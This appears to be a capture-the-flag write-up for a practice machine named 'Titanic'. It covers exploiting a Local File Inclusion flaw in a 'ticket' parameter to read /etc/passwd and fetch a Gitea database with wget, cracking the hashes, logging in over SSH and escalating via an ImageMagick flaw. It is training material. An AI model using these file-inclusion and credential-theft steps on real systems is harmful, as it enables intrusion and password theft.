# Titanic Machine - Notes

## Initial Foothold

1. **Nmap Scan**:
   - Discovered open ports: **HTTP** and **SSH**.

2. **Website Analysis**:
   - Found a booking URL on the website.
   - After making a reservation, noticed that the web server creates a route with the parameter `ticket` pointing to a file.

3. **Vulnerability**:
   - The `ticket` parameter is vulnerable to **Local File Inclusion (LFI)**.

## Exploitation

1. **Enumerating Users**:
   - Extracted `/etc/passwd` using LFI:
     ```
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
     bin:x:2:2:bin:/bin:/usr/sbin/nologin
     sys:x:3:3:sys:/dev:/usr/sbin/nologin
     sync:x:4:65534:sync:/bin:/bin/sync
     games:x:5:60:games:/usr/games:/usr/sbin/nologin
     man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
     lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
     mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
     news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
     uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
     proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
     www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
     backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
     list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
     irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
     gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
     nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
     _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
     systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
     systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
     messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
     systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
     pollinate:x:105:1::/var/cache/pollinate:/bin/false
     sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
     syslog:x:107:113::/home/syslog:/usr/sbin/nologin
     uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
     tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
     tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
     landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
     fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
     usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
     developer:x:1000:1000:developer:/home/developer:/bin/bash
     lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
     dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
     _laurel:x:998:998::/var/log/laurel:/bin/false
     ```

2. **Retrieving the User Flag**:
   - Accessed the user flag:
     ```
     /home/developer/user.txt
     ```

3. **Gitea Configuration**:
   - Found the Gitea configuration file:
     ```
     /home/developer/gitea/data/gitea/conf/app.ini
     ```

   - Discovered a path to the MySQL database:
     ```
     wget http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
     ```

4. **Extracting and Cracking Hashes**:
   - Used the following GitHub repository to extract and convert hashes into a crackable format:
     [gitea2hashcat](https://github.com/f4dee-backup/gitea2hashcat)

   - Successfully cracked the password for the `developer` user.

5. **SSH Access**:
   - Logged in as `developer` via SSH using the cracked password.
6. **Root access**
   - Found a vulnerable version of version magick, and used the POC (didn't really get it) 
## Notes
- The LFI vulnerability was key to accessing sensitive files.
- The Gitea database contained hashes that were extracted and cracked to gain access.
- Always check for configuration files like `app.ini` when enumerating services like Gitea.